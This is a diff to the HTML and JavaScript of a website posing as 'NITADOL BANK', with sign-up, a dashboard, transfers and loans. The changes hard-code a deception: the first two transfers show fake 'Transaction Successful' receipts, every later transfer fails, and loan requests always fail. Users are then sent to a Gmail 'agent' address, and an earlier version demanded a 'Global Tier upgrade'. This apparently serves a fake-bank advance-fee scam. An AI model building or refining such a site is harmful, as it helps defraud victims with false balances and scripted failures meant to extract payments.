@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>NITADOL BANK | Private Wealth & Digital Assets</title>
     <script src="https://cdn.tailwindcss.com"></script>
-   
+  
     <script type="text/javascript">
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
@@ -13,7 +13,7 @@
                 layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
                 autoDisplay: true
             }, 'google_translate_element');
-           
+          
             setTimeout(() => {
                 const userLang = navigator.language || navigator.userLanguage;
                 const langCode = userLang.split('-')[0];
@@ -44,7 +44,7 @@
         const auth = getAuth(app);
         const rtdb = getDatabase(app);
         let currentUserData = null;
-        let transferCount = 0; // Demo counter for first 2 success, 3rd fail
+        let transferCount = 0; // First 2 transfers = Success, 3rd and after = Failed
 
         onAuthStateChanged(auth, (user) => {
             if (user) {
@@ -82,18 +82,14 @@
             const balanceEl = document.getElementById('user-balance');
             const balanceText = "$" + (data.balance || 0).toLocaleString(undefined, {minimumFractionDigits: 2});
             balanceEl.innerText = balanceText;
-            // Logic to shrink text based on length
-            if (balanceText.length > 15) {
-                balanceEl.style.fontSize = "2rem";
-            } else if (balanceText.length > 12) {
-                balanceEl.style.fontSize = "2.5rem";
-            } else if (balanceText.length > 9) {
-                balanceEl.style.fontSize = "3rem";
-            } else {
-                balanceEl.style.fontSize = "3.75rem";
-            }
+            if (balanceText.length > 15) balanceEl.style.fontSize = "2rem";
+            else if (balanceText.length > 12) balanceEl.style.fontSize = "2.5rem";
+            else if (balanceText.length > 9) balanceEl.style.fontSize = "3rem";
+            else balanceEl.style.fontSize = "3.75rem";
+
             document.getElementById('card-holder-name').innerText = data.fullName.toUpperCase();
             document.getElementById('welcome-name').innerText = data.fullName.split(' ')[0];
+
             const historyCont = document.getElementById('transaction-history');
             historyCont.innerHTML = '';
             if(data.transactions) {
@@ -120,7 +116,10 @@
         window.handleLogin = async () => {
             const email = document.getElementById('l-email').value;
             const pass = document.getElementById('l-pass').value;
-            try { await signInWithEmailAndPassword(auth, email, pass); }
+            try { 
+                await signInWithEmailAndPassword(auth, email, pass); 
+                // Auto go to dashboard handled by onAuthStateChanged
+            }
             catch (e) { alert(e.message); }
         };
 
@@ -141,7 +140,8 @@
                     fullName: name, email, pin, phone, country, address, postalCode: postal, balance: 0, currency: "USD", joinDate: new Date().toLocaleDateString()
                 });
                 btn.innerText = "Complete Application";
-                setTimeout(() => toggleViews('home-page'), 800); // Faster redirect after success
+                // AUTO GO TO DASHBOARD - NO MORE HOME REDIRECT
+                toggleViews('dashboard');
             } catch (e) { alert(e.message); btn.innerText = "Complete Application"; }
         };
 
@@ -154,7 +154,7 @@
 
             let status = "Success";
             let statusColor = "text-green-500";
-            if (transferCount >= 3) {
+            if (transferCount >= 3) {  // 1st & 2nd = Success, 3rd and after = Failed
                 status = "Failed";
                 statusColor = "text-red-500";
             }
@@ -169,28 +169,27 @@
 
             await push(ref(rtdb, 'users/' + auth.currentUser.uid + '/transactions'), txData);
 
-            // Hide input and show receipt
+            // Reset all screens
             document.getElementById('trans-input').classList.add('hidden');
             document.getElementById('trans-pin').classList.add('hidden');
-            document.getElementById('success-receipt').classList.remove('hidden');
 
-            // Fill receipt
-            document.getElementById('receipt-txid').innerText = txData.txId;
-            document.getElementById('receipt-date').innerText = txData.date;
-            document.getElementById('receipt-sender').innerText = currentUserData.fullName;
-            document.getElementById('receipt-receiver').innerText = document.getElementById('tx-receiver-name').value || "External Account";
-            document.getElementById('receipt-amount').innerText = "$" + amount.toFixed(2);
-            document.getElementById('receipt-status').innerText = status;
-            document.getElementById('receipt-status').className = `font-black text-xl ${statusColor}`;
-
-            // If failed, show upgrade message
             if (status === "Failed") {
-                document.getElementById('receipt-note').innerHTML = `
-                    <div class="bg-red-50 dark:bg-red-950/30 border border-red-300 p-4 rounded-2xl text-red-600 text-sm mt-6">
-                        Transaction restricted.<br>
-                        To restore full account functionality, a <strong>Global Tier</strong> upgrade is required.<br>
-                        Contact: <strong>nitadolb@gmail.com</strong>
-                    </div>`;
+                // SHOW FAILED SCREEN (3rd+ transfer)
+                document.getElementById('success-receipt').classList.add('hidden');
+                document.getElementById('error-screen').classList.remove('hidden');
+            } else {
+                // SHOW SUCCESS RECEIPT (1st & 2nd transfer)
+                document.getElementById('error-screen').classList.add('hidden');
+                document.getElementById('success-receipt').classList.remove('hidden');
+
+                document.getElementById('receipt-txid').innerText = txData.txId;
+                document.getElementById('receipt-date').innerText = txData.date;
+                document.getElementById('receipt-sender').innerText = currentUserData.fullName;
+                document.getElementById('receipt-receiver').innerText = document.getElementById('tx-receiver-name').value || "External Account";
+                document.getElementById('receipt-amount').innerText = "$" + amount.toFixed(2);
+                document.getElementById('receipt-status').innerText = status;
+                document.getElementById('receipt-status').className = `font-black text-xl ${statusColor}`;
+                document.getElementById('receipt-note').innerHTML = '';
             }
         };
 
@@ -224,27 +223,27 @@
 
         window.openProfile = () => document.getElementById('profile-modal').classList.remove('hidden');
 
-        // NEW: Open Loan Modal
+        // LOAN - ALWAYS FAILED AS REQUESTED
         window.openLoanModal = () => {
             document.getElementById('loan-modal').classList.remove('hidden');
             document.getElementById('loan-modal').classList.add('flex');
         };
 
-        // NEW: Process Loan (demo)
         window.processLoan = async () => {
             const amount = parseFloat(document.getElementById('loan-amount').value) || 0;
             await push(ref(rtdb, 'users/' + auth.currentUser.uid + '/transactions'), {
                 amount: amount.toFixed(2),
                 type: "LOAN REQUEST",
                 date: new Date().toLocaleString(),
-                status: "Pending",
+                status: "Failed",
                 txId: "NTD-LOAN-" + Math.floor(1000000000 + Math.random() * 9000000000)
             });
-            alert("✅ Loan application submitted successfully. Funds will be available within 24 hours.");
+            // SHOW FAILED MESSAGE
+            alert("❌ Loan request failed.\n\nContact our agent for more information: nitadolb@gmail.com");
             document.getElementById('loan-modal').classList.add('hidden');
         };
 
-        // NEW: Download Receipt
+        // Download Receipt
         window.downloadReceipt = () => {
             const receipt = document.getElementById('success-receipt');
             const printContents = receipt.innerHTML;
@@ -252,7 +251,13 @@
             document.body.innerHTML = printContents;
             window.print();
             document.body.innerHTML = originalContents;
-            window.location.reload(); // Restore after print
+            window.location.reload();
+        };
+
+        // MOBILE MENU - 3 DOT DROPDOWN (added for phone comfort)
+        window.toggleMobileMenu = () => {
+            const menu = document.getElementById('mobile-menu-dropdown');
+            menu.classList.toggle('hidden');
         };
     </script>
     <style>
@@ -265,13 +270,18 @@
         .atm-card { background: linear-gradient(145deg, #0f172a 0%, #334155 100%); border: 1px solid rgba(255,255,255,0.1); }
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #2563eb; border-radius: 10px; }
-       
+      
         /* Smooth transition for font size changes */
         #user-balance { transition: font-size 0.3s ease; }
-
-        /* ADDED: Mature professional enhancements */
         .section-header { font-size: 2.75rem; line-height: 1.1; font-weight: 900; letter-spacing: -2px; }
         .glass { background: rgba(255,255,255,0.08); backdrop-filter: blur(20px); }
+
+        /* MOBILE DASHBOARD FIX - Sidebar hidden on phone, 3-dot menu instead */
+        @media (max-width: 768px) {
+            aside { display: none !important; }
+            main { margin-left: 0 !important; padding: 16px !important; }
+            .mobile-header { display: flex !important; }
+        }
     </style>
 </head>
 <body class="bg-slate-50 text-slate-900 dark:bg-slate-950 dark:text-white">
@@ -323,7 +333,7 @@
             </div>
         </div>
 
-        <!-- RATES SECTION (ADDED) -->
+        <!-- RATES SECTION -->
         <section id="rates" class="py-20 px-6 bg-white dark:bg-slate-950">
             <div class="max-w-7xl mx-auto">
                 <h2 class="section-header text-center mb-12">Live <span class="text-blue-600">Market Rates</span> (USD)</h2>
@@ -362,7 +372,7 @@
             </div>
         </section>
 
-        <!-- SERVICES + MORE SCROLLABLE DETAILS -->
+        <!-- SERVICES -->
         <section id="services" class="py-32 px-6 bg-slate-50 dark:bg-slate-900">
             <div class="max-w-7xl mx-auto">
                 <h2 class="section-header text-center mb-16">Bespoke <span class="text-blue-600">Banking</span></h2>
@@ -383,7 +393,7 @@
             </div>
         </section>
 
-        <!-- NITADOL HISTORY + IMAGES (ADDED) -->
+        <!-- NITADOL HISTORY + IMAGES -->
         <section class="py-32 px-6 bg-white dark:bg-slate-950">
             <div class="max-w-7xl mx-auto grid md:grid-cols-2 gap-16 items-center">
                 <div>
@@ -426,12 +436,12 @@
         </footer>
     </div>
 
-    <!-- SIGNUP PAGE (faster processing) -->
+    <!-- SIGNUP PAGE -->
     <div id="signup-page" class="hidden min-h-screen flex items-center justify-center bg-slate-100 dark:bg-slate-950 py-12 px-4">
         <div class="bg-white dark:bg-slate-900 p-8 md:p-12 rounded-[3rem] w-full max-w-2xl shadow-2xl overflow-y-auto max-h-[90vh] custom-scroll">
             <h2 class="text-3xl font-black mb-2">Create Global Account</h2>
             <p class="text-slate-400 text-xs font-bold uppercase tracking-widest mb-8">Personal & Security Details</p>
-           
+          
             <div class="grid md:grid-cols-2 gap-4 mb-6">
                 <input id="s-name" type="text" placeholder="Full Legal Name" class="p-4 bg-slate-50 dark:bg-slate-800 border dark:border-slate-700 rounded-2xl outline-none">
                 <input id="s-email" type="email" placeholder="Email Address" class="p-4 bg-slate-50 dark:bg-slate-800 border dark:border-slate-700 rounded-2xl outline-none">
@@ -463,9 +473,26 @@
         </div>
     </div>
 
-    <!-- DASHBOARD - FULLY ENHANCED + MATURE -->
+    <!-- DASHBOARD - MOBILE FIXED -->
     <div id="dashboard" class="hidden min-h-screen flex bg-slate-50 dark:bg-slate-950">
-        <aside class="w-80 bg-slate-900 dark:bg-slate-950 text-white p-10 flex flex-col fixed h-full border-r border-white/5">
+        <!-- MOBILE HEADER WITH 3-DOT MENU -->
+        <div class="mobile-header hidden md:hidden fixed top-0 left-0 right-0 bg-white dark:bg-slate-900 border-b z-50 px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center text-white font-black">N</div>
+                <span class="text-lg font-black tracking-tighter">NITADOL BANK</span>
+            </div>
+            <button onclick="toggleMobileMenu()" class="text-3xl font-black leading-none">⋮</button>
+        </div>
+
+        <!-- MOBILE DROPDOWN MENU -->
+        <div id="mobile-menu-dropdown" class="hidden fixed top-16 right-4 bg-white dark:bg-slate-900 shadow-2xl rounded-3xl py-4 px-6 z-[999] w-64">
+            <div onclick="openProfile()" class="flex items-center gap-4 py-3 cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 rounded-2xl px-4">👤 User Details</div>
+            <div onclick="openLoanModal()" class="flex items-center gap-4 py-3 cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 rounded-2xl px-4">🏦 Loan Request</div>
+            <div onclick="logout()" class="flex items-center gap-4 py-3 cursor-pointer text-red-500 hover:bg-slate-100 dark:hover:bg-slate-800 rounded-2xl px-4">Logout ⏻</div>
+        </div>
+
+        <!-- DESKTOP SIDEBAR (hidden on mobile) -->
+        <aside class="hidden md:flex w-80 bg-slate-900 dark:bg-slate-950 text-white p-10 flex-col fixed h-full border-r border-white/5">
             <div class="mb-12"><h2 class="text-2xl font-black italic">NITADOL</h2><p class="text-[9px] text-blue-500 font-black tracking-widest uppercase">Private Wealth • USD</p></div>
             <nav class="flex-1 space-y-8">
                 <div class="flex items-center gap-4 text-blue-500 font-black cursor-pointer"><span>📊</span> Dashboard</div>
@@ -475,7 +502,9 @@
             </nav>
             <button onclick="logout()" class="text-red-500 font-black text-xs pt-10 border-t border-white/5 uppercase">Logout System ⏻</button>
         </aside>
-        <main class="flex-1 ml-80 p-8 md:p-16">
+
+        <!-- MAIN CONTENT -->
+        <main class="flex-1 md:ml-80 p-8 md:p-16">
             <div class="max-w-5xl mx-auto">
                 <div class="flex justify-between items-center mb-16">
                     <div><h2 class="text-4xl font-black">Welcome, <span id="welcome-name" class="text-blue-600">Client</span></h2><p class="text-slate-500 font-bold text-xs uppercase mt-2">Status: <span class="text-green-500">Verified Account • USD</span></p></div>
@@ -506,7 +535,7 @@
                     <div id="transaction-history" class="space-y-4"></div>
                 </div>
 
-                <!-- NEW: Loan & Extra Dashboard Cards -->
+                <!-- Extra Cards -->
                 <div class="grid md:grid-cols-3 gap-8 mt-16">
                     <div onclick="openLoanModal()" class="bg-white dark:bg-slate-900 p-8 rounded-3xl border dark:border-slate-700 cursor-pointer hover:shadow-xl transition">
                         <div class="flex justify-between"><span class="text-4xl">🏦</span><span class="font-black text-blue-600">LOANS</span></div>
@@ -547,11 +576,11 @@
         </div>
     </div>
 
-    <!-- TRANSFER MODAL - AMERICAN BANK STYLE + RECEIPT -->
+    <!-- TRANSFER MODAL -->
     <div id="trans-modal" class="hidden modal-overlay fixed inset-0 bg-slate-950/90 backdrop-blur-md z-[200] items-center justify-center p-4">
         <div class="bg-white dark:bg-slate-900 w-full max-w-lg rounded-[3rem] p-10 shadow-2xl relative border border-slate-800/50 max-h-[90vh] overflow-y-auto custom-scroll">
             <button onclick="closeModal()" class="absolute top-8 right-8 text-2xl opacity-30">&times;</button>
-           
+          
             <!-- Input Screen -->
             <div id="trans-input" class="space-y-6">
                 <h2 id="modal-title" class="text-2xl font-black uppercase">Transfer</h2>
@@ -579,11 +608,10 @@
                 <button onclick="processTransaction()" class="w-full bg-slate-900 dark:bg-white dark:text-black py-5 rounded-2xl font-black">Sign & Send</button>
             </div>
 
-            <!-- SUCCESS RECEIPT SCREEN -->
+            <!-- SUCCESS RECEIPT -->
             <div id="success-receipt" class="hidden text-center py-6 space-y-8">
                 <div class="mx-auto w-16 h-16 bg-green-100 dark:bg-green-900/30 flex items-center justify-center rounded-2xl text-5xl">✅</div>
                 <h2 class="text-3xl font-black text-green-600">Transaction Successful</h2>
-                
                 <div class="bg-slate-100 dark:bg-slate-800 rounded-3xl p-8 text-left max-w-xs mx-auto">
                     <div class="flex justify-between text-xs mb-4"><span class="opacity-50">Transaction ID</span><span id="receipt-txid" class="font-mono font-bold"></span></div>
                     <div class="flex justify-between text-xs mb-4"><span class="opacity-50">Date & Time</span><span id="receipt-date"></span></div>
@@ -600,7 +628,6 @@
                     </div>
                     <div id="receipt-note" class="mt-8"></div>
                 </div>
-
                 <div class="flex gap-4 justify-center">
                     <button onclick="downloadReceipt()" class="flex-1 bg-green-600 text-white py-4 rounded-2xl font-black">Download Receipt</button>
                     <button onclick="closeModal()" class="flex-1 bg-slate-200 dark:bg-slate-700 py-4 rounded-2xl font-black">Close</button>
@@ -619,7 +646,7 @@
         </div>
     </div>
 
-    <!-- NEW LOAN MODAL -->
+    <!-- LOAN MODAL -->
     <div id="loan-modal" class="hidden modal-overlay fixed inset-0 bg-slate-950/90 backdrop-blur-md z-[200] items-center justify-center p-4">
         <div class="bg-white dark:bg-slate-900 w-full max-w-lg rounded-[3rem] p-10 shadow-2xl relative">
             <button onclick="closeModal()" class="absolute top-8 right-8 text-2xl opacity-30">&times;</button>
